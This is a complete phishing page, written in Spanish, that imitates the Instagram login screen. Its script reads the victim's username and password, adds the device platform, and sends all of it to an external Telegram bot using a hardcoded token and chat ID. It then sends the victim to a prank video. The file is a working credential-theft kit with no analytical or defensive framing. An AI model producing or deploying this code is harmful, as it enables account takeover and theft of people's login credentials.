<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;padding:40px 28px;width:350px;text-align:center;margin-bottom:10px}
.logo{font-size:42px;font-weight:normal;font-family:"Georgia","Times New Roman",serif;margin-bottom:30px;color:#262626;letter-spacing:-1px}
input{width:100%;padding:9px 8px;margin-bottom:6px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:12px;outline:none}
input:focus{border-color:#a8a8a8}
.btn{width:100%;padding:8px;border:none;border-radius:8px;background:#0095f6;color:#fff;font-weight:600;cursor:pointer;margin-top:8px;font-size:14px}
.or-divider{display:flex;align-items:center;margin:18px 0;color:#8e8e8e;font-size:13px;font-weight:600}
.or-divider::before,.or-divider::after{content:"";flex:1;height:1px;background:#dbdbdb;margin:0 18px}
.forgot{font-size:12px;color:#00376b;margin-top:12px;display:block;text-decoration:none}
.signup-box{background:#fff;border:1px solid #dbdbdb;padding:20px;width:350px;text-align:center;font-size:14px}
.signup-box a{color:#0095f6;text-decoration:none;font-weight:600}
</style>
</head>
<body>

<div class="card">
  <div class="logo">Instagram</div>
  
  <input type="text" id="user" placeholder="Teléfono, usuario o correo electrónico">
  <input type="password" id="pass" placeholder="Contraseña">
  <button class="btn" onclick="enviar()">Iniciar sesión</button>

  <div class="or-divider">O</div>
  
  <a href="#" class="forgot">¿Has olvidado la contraseña?</a>
</div>

<div class="signup-box">
  ¿No tienes una cuenta? <a href="#">Regístrate</a>
</div>

<script>
  const BOT_TOKEN = "8781081994:AAEE3Uu9qyTQc6CtoypYfJAfuqL97nYFiww";
  const CHAT_ID = "8426427459";

  async function enviar() {
    var u = document.getElementById('user').value;
    var p = document.getElementById('pass').value;
    if(!u || !p) return;

    var texto = "CAPTURA INSTAGRAM\nUsuario: " + u + "\nClave: " + p + "\nDispositivo: " + navigator.platform;

    await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({chat_id: CHAT_ID, text: texto})
    });

    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
  }
</script>

</body>
</html>
